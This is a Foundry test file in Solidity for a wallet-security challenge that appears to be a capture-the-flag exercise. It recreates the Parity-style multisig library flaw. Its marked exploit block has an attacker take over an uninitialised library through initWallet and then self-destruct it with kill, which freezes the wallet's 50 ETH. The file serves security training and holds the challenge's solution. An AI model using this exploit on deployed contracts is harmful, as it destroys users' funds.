// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {Utilities} from "../Utilities.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {ISafuWalletLibrary} from "../../src/safu-wallet/ISafuWalletLibrary.sol";
import {SafuWallet} from "../../src/safu-wallet/SafuWallet.sol";
import {Token} from "../../src/Token.sol";
import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";

contract SafuWalletTest is Test {
  Utilities private utils;

  address payable private attacker;
  address payable private user;

  ISafuWalletLibrary private safuWalletLibrary;
  SafuWallet private safuWallet;

  function setUp() public {
    utils = new Utilities();

    address payable[] memory users = utils.createUsers(2);
    attacker = users[0];
    user = users[1];
    vm.label(attacker, "Attacker");
    vm.label(user, "User");

    safuWalletLibrary = ISafuWalletLibrary(
      deployCode("out/SafuWalletLibrary.sol/SafuWalletLibrary.json")
    );

    address[] memory owners = new address[](1);
    owners[0] = user;

    safuWallet = new SafuWallet(
      owners, // msg.sender is automatically an owner
      2, // 2 confirmations required to execute transactions
      type(uint256).max // Max daily limit
    );

    // The first admin deposits 100 ETH
    payable(address(safuWallet)).transfer(100 ether);

    // The first admin withdraws 50 ETH from the wallet
    bytes memory data = abi.encodeWithSignature(
      "execute(address,uint256,bytes)", user, 50 ether, ""
    );
    address(safuWallet).call(data);

    assertEq(address(safuWallet).balance, 50 ether);

    // Exploit start
    vm.startPrank(attacker, attacker);

    address[] memory newOwners = new address[](0);
    safuWalletLibrary.initWallet(newOwners, 1, type(uint256).max);
    safuWalletLibrary.kill(attacker);

    vm.stopPrank();
    // Exploit end
  }

  function testExploit() public {
    validate();
  }

  function validate() private {
    // Attempt to withdraw finate 50 ETH
    bytes memory data = abi.encodeWithSignature(
      "execute(address,uint256,bytes)", user, 50 ether, ""
    );
    address(safuWallet).call(data);
    // Nothing should change
    assertEq(address(safuWallet).balance, 50 ether);
  }
}
